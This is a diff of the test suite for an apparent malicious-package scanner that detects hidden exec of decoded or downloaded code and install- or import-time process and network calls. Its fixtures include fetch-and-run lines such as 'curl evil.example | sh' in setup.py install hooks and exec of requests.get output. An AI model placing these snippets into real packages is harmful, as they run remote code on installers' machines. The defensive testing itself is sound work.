@@ -13,14 +13,10 @@ from crotalus.models import (
     Release,
     ReleaseMetadata,
 )
-from crotalus.rules.helpers.import_graph import import_time_calls, modules_run_on_import
-from crotalus.rules.helpers.static_code_analysis import calls, read
+from crotalus.rules.helpers.import_graph import modules_run_on_import, modules_run_on_install
+from crotalus.rules.helpers.static_code_analysis import calls, dangerous_behaviour, read
 from crotalus.rules.hidden_code import hidden_code_exec, pth_import_running_code
-from crotalus.rules.process_and_network import (
-    import_time_code,
-    setup_py_install_time,
-    unimported_script_code,
-)
+from crotalus.rules.process_and_network import process_and_network_code
 
 
 def call_names(source: str) -> list[str | None]:
@@ -119,6 +115,23 @@ def test_attribute_assignment_does_not_taint_object() -> None:
     assert hidden_code_exec.check(context(wheel={"pkg/header.py": source})) == []
 
 
+@pytest.mark.parametrize(
+    ("call_name", "behaviour"),
+    [
+        ("exec", "runs_code"),
+        ("zlib.decompress", "decodes_data"),
+        ("requests.get", "network_request"),
+        ("httpx.Timeout", None),  # in a network module, but connects to nothing
+        ("os.system", "starts_process"),
+        ("subprocess.Popen", "starts_process"),
+        ("os.path.join", None),
+        (None, None),  # a name only known at runtime
+    ],
+)
+def test_dangerous_behaviour(call_name: str | None, behaviour: str | None) -> None:
+    assert dangerous_behaviour(call_name) == behaviour
+
+
 def test_invalid_python_is_skipped() -> None:
     assert read("print 'python 2'") is None
     assert read("\0") is None
@@ -128,30 +141,41 @@ def test_invalid_python_is_skipped() -> None:
 
 
 @pytest.mark.parametrize(
-    ("source", "kinds"),
+    ("source", "decoders", "network"),
     [
-        ("import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))", ["decoded"]),
-        ("import base64 as b\nimport zlib\nexec(zlib.decompress(b.b64decode(x)))", ["decoded"]),
-        ("import zlib\ncode = zlib.decompress(blob)\nexec(code)", ["decoded"]),
-        ("from base64 import b64decode as d\nimport builtins\nbuiltins.eval(d(x))", ["decoded"]),
-        ("e = exec\ne(bytes.fromhex(x))", ["decoded"]),
-        ("import marshal\nexec(marshal.loads(blob))", ["decoded"]),
-        ("import requests\nexec(requests.get('https://evil.example').text)", ["network"]),
+        ("import base64\nexec(base64.b64decode('aW1wb3J0IG9z'))", ["base64.b64decode"], []),
+        (
+            "import base64 as b\nimport zlib\nexec(zlib.decompress(b.b64decode(x)))",
+            ["base64.b64decode", "zlib.decompress"],
+            [],
+        ),
+        ("import zlib\ncode = zlib.decompress(blob)\nexec(code)", ["zlib.decompress"], []),
+        (
+            "from base64 import b64decode as d\nimport builtins\nbuiltins.eval(d(x))",
+            ["base64.b64decode"],
+            [],
+        ),
+        ("e = exec\ne(bytes.fromhex(x))", ["bytes.fromhex"], []),
+        ("import marshal\nexec(marshal.loads(blob))", ["marshal.loads"], []),
+        ("import requests\nexec(requests.get('https://evil.example').text)", [], ["requests.get"]),
         (
             "from urllib.request import urlopen\nr = urlopen(u)\ndata = r.read()\nexec(data)",
-            ["network"],
+            [],
+            ["urllib.request.urlopen"],
         ),
         (
             "import requests, base64\nexec(base64.b64decode(requests.get(u).text))",
-            ["decoded", "network"],
+            ["base64.b64decode"],
+            ["requests.get"],
         ),
     ],
 )
-def test_hidden_code_exec(source: str, kinds: list[str]) -> None:
+def test_hidden_code_exec(source: str, decoders: list[str], network: list[str]) -> None:
     findings = hidden_code_exec.check(context(wheel={"pkg/__init__.py": source}))
     assert rule_ids(findings) == ["hidden_code_exec"]
     assert findings[0].severity == "critical"
-    assert findings[0].evidence["kinds"] == kinds
+    assert findings[0].evidence["decoders"] == decoders
+    assert findings[0].evidence["network"] == network
     assert findings[0].evidence["file"] == "pkg/__init__.py"
 
 
@@ -205,6 +229,13 @@ def test_pth_critical_calls(line: str) -> None:
     assert findings[0].severity == "critical"
 
 
+def test_pth_network_module_without_a_request_is_medium() -> None:
+    findings = pth_import_running_code.check(
+        context(wheel={"x.pth": "import socket; socket.gethostname()\n"})
+    )
+    assert findings[0].severity == "medium"
+
+
 def test_pth_import_only_is_medium() -> None:
     findings = pth_import_running_code.check(context(wheel={"pkg_init.pth": "import pkg\n"}))
     assert findings[0].severity == "medium"
@@ -244,7 +275,7 @@ def test_pth_in_sdist_is_ignored() -> None:
     assert pth_import_running_code.check(context(sdist=files)) == []
 
 
-# setup_py_install_time
+# install_time_code
 
 
 @pytest.mark.parametrize(
@@ -273,9 +304,9 @@ def test_pth_in_sdist_is_ignored() -> None:
         ),
     ],
 )
-def test_setup_py_install_time(setup_py: str, severity: str) -> None:
-    findings = setup_py_install_time.check(context(sdist={"setup.py": setup_py}))
-    assert rule_ids(findings) == ["setup_py_install_time"]
+def test_install_time_code(setup_py: str, severity: str) -> None:
+    findings = process_and_network_code.check(context(sdist={"setup.py": setup_py}))
+    assert rule_ids(findings) == ["install_time_code"]
     assert findings[0].severity == severity
 
 
@@ -285,7 +316,7 @@ def test_setup_py_evidence_lists_calls_in_order() -> None:
         subprocess.run(['git', 'describe'])
         os.system('x')
         """
-    findings = setup_py_install_time.check(context(sdist={"setup.py": setup_py}))
+    findings = process_and_network_code.check(context(sdist={"setup.py": setup_py}))
     calls_found = findings[0].evidence["calls"]
     assert [c["call"] for c in calls_found] == ["subprocess.run", "os.system"]
     assert calls_found[0]["snippet"] == "subprocess.run(['git', 'describe'])"
@@ -302,24 +333,82 @@ def test_setup_py_evidence_lists_calls_in_order() -> None:
     ],
 )
 def test_setup_py_that_is_fine(files: dict[str, str]) -> None:
-    assert setup_py_install_time.check(context(sdist=files)) == []
+    assert process_and_network_code.check(context(sdist=files)) == []
 
 
 def test_setup_py_in_wheel_is_ignored() -> None:
     files = {"setup.py": "import os\nos.system('x')"}
-    assert setup_py_install_time.check(context(wheel=files)) == []
+    assert process_and_network_code.check(context(wheel=files)) == []
+
+
+def test_install_time_custom_install_command() -> None:
+    # Not top-level code, but setuptools calls run() during the install.
+    setup_py = """
+        import os
+        from setuptools.command.install import install
+        class Install(install):
+            def run(self):
+                os.system('curl evil.example | sh')
+        """
+    findings = process_and_network_code.check(context(sdist={"setup.py": setup_py}))
+    assert findings[0].evidence["calls"][0]["call"] == "os.system"
+
+
+def test_install_time_follows_what_setup_py_imports() -> None:
+    sdist = {
+        "setup.py": "from _build import version\nsetup(version=version)",
+        "_build.py": "import os\nos.system('curl evil.example | sh')\nversion = '1.0'",
+    }
+    # A clean wheel: what the import graph reads never includes _build.py.
+    findings = process_and_network_code.check(context(sdist=sdist, wheel={"pkg/__init__.py": ""}))
+    assert rule_ids(findings) == ["install_time_code"]
+    assert {c["file"] for c in findings[0].evidence["calls"]} == {"_build.py"}
+
+
+def test_install_time_counts_only_import_time_code_of_imported_modules() -> None:
+    sdist = {
+        "setup.py": "from pkg import __version__",
+        "pkg/__init__.py": "import os\n__version__ = '1.0'\ndef run():\n    os.system('x')",
+    }
+    assert process_and_network_code.check(context(sdist=sdist, wheel={})) == []
+
+
+def test_modules_run_on_install() -> None:
+    files = {
+        "setup.py": "from pkg import __version__",
+        "pkg/__init__.py": "from .version import __version__",
+        "pkg/version.py": "",
+        "pkg/cli.py": "",  # the package's, but setup.py doesn't import it
+        "tests/test_pkg.py": "",
+    }
+    assert sorted(modules_run_on_install(files)) == [
+        "pkg/__init__.py",
+        "pkg/version.py",
+        "setup.py",
+    ]
+    assert modules_run_on_install({"pkg/__init__.py": ""}) == set()  # no setup.py
+
+
+def test_install_and_import_time_are_separate_rules() -> None:
+    sdist = {"setup.py": "import os\nos.system('x')"}
+    wheel = {"pkg/__init__.py": "import subprocess\nsubprocess.Popen(['sh'])"}
+    findings = process_and_network_code.check(context(sdist=sdist, wheel=wheel))
+    assert sorted((f.rule_id, f.severity) for f in findings) == [
+        ("import_time_code", "high"),
+        ("install_time_code", "medium"),
+    ]
 
 
 # import_time_code
 
 
-def import_time_names(source: str) -> list[str | None]:
+def import_time_names(source: str) -> list[str]:
     py_file = read(textwrap.dedent(source))
     assert py_file is not None
-    return sorted(name or "" for name, _ in import_time_calls(py_file))
+    return sorted(name or "" for name, _ in calls(py_file, import_time_only=True))
 
 
-def test_import_time_calls_skip_functions_and_main_guard() -> None:
+def test_import_time_only_skips_functions_and_main_guard() -> None:
     source = """
         import os
         os.getcwd()
@@ -339,7 +428,7 @@ def test_import_time_calls_skip_functions_and_main_guard() -> None:
     "start",
     ["_run()", "threading.Thread(target=_run).start()"],
 )
-def test_import_time_calls_follow_functions_run_on_import(start: str) -> None:
+def test_import_time_only_follows_functions_run_on_import(start: str) -> None:
     source = f"""
         import os, threading
         def _run():
@@ -366,10 +455,10 @@ def test_import_time_calls_follow_functions_run_on_import(start: str) -> None:
     ],
 )
 def test_import_time_code(init_py: str, severity: str) -> None:
-    findings = import_time_code.check(context(wheel={"pkg/__init__.py": init_py}))
+    findings = process_and_network_code.check(context(wheel={"pkg/__init__.py": init_py}))
     assert rule_ids(findings) == ["import_time_code"]
     assert findings[0].severity == severity
-    assert findings[0].evidence["files"] == ["pkg/__init__.py"]
+    assert {c["file"] for c in findings[0].evidence["calls"]} == {"pkg/__init__.py"}
 
 
 @pytest.mark.parametrize(
@@ -377,7 +466,7 @@ def test_import_time_code(init_py: str, severity: str) -> None:
     [
         {"pkg/__init__.py": "import subprocess\ndef run():\n    subprocess.run(['x'])"},
         {"pkg/__init__.py": "import os\npath = os.path.join('a', 'b')"},
-        {"setup.py": "import os\nos.system('x')"},  # setup_py_install_time's job
+        {"setup.py": "import os\nos.system('x')"},  # in a wheel: never run
         {"tests/__init__.py": "import subprocess\nsubprocess.run(['pytest'])"},
         {"pkg/__main__.py": "import subprocess\nsubprocess.run(['x'])"},
         # Settings objects from a network library send nothing.
@@ -392,7 +481,7 @@ def test_import_time_code(init_py: str, severity: str) -> None:
     ],
 )
 def test_import_time_code_that_is_fine(files: dict[str, str]) -> None:
-    assert import_time_code.check(context(wheel=files)) == []
+    assert "import_time_code" not in rule_ids(process_and_network_code.check(context(wheel=files)))
 
 
 def test_import_time_code_follows_imports() -> None:
@@ -400,8 +489,8 @@ def test_import_time_code_follows_imports() -> None:
         "pkg/__init__.py": "from . import _setup",
         "pkg/_setup.py": "import subprocess\nsubprocess.Popen(['sh', '-c', 'x'])",
     }
-    findings = import_time_code.check(context(wheel=files))
-    assert findings[0].evidence["files"] == ["pkg/_setup.py"]
+    findings = process_and_network_code.check(context(wheel=files))
+    assert {c["file"] for c in findings[0].evidence["calls"]} == {"pkg/_setup.py"}
 
 
 def test_modules_run_on_import() -> None:
@@ -434,8 +523,8 @@ def test_modules_run_on_import() -> None:
 def test_import_time_code_prefers_the_wheel() -> None:
     bad = {"pkg/__init__.py": "import os\nos.system('x')"}
     fine = {"pkg/__init__.py": "VERSION = '1.0'"}
-    assert import_time_code.check(context(sdist=bad, wheel=fine)) == []
-    assert rule_ids(import_time_code.check(context(sdist=bad))) == ["import_time_code"]
+    assert process_and_network_code.check(context(sdist=bad, wheel=fine)) == []
+    assert rule_ids(process_and_network_code.check(context(sdist=bad))) == ["import_time_code"]
 
 
 # unimported_script_code
@@ -454,15 +543,14 @@ def test_import_time_code_prefers_the_wheel() -> None:
     ],
 )
 def test_unimported_script_code(files: dict[str, str]) -> None:
-    findings = unimported_script_code.check(context(wheel=files))
+    findings = process_and_network_code.check(context(wheel=files))
     assert rule_ids(findings) == ["unimported_script_code"]
     assert findings[0].severity == "medium"
 
 
 def test_imported_code_is_import_time_codes_job() -> None:
     files = {"pkg/__init__.py": "import subprocess\nsubprocess.Popen(['sh', '-c', 'x'])"}
-    assert unimported_script_code.check(context(wheel=files)) == []
-    assert rule_ids(import_time_code.check(context(wheel=files))) == ["import_time_code"]
+    assert rule_ids(process_and_network_code.check(context(wheel=files))) == ["import_time_code"]
 
 
 @pytest.mark.parametrize(
@@ -474,4 +562,4 @@ def test_imported_code_is_import_time_codes_job() -> None:
     ],
 )
 def test_unimported_script_code_that_is_fine(files: dict[str, str]) -> None:
-    assert unimported_script_code.check(context(wheel=files)) == []
+    assert process_and_network_code.check(context(wheel=files)) == []
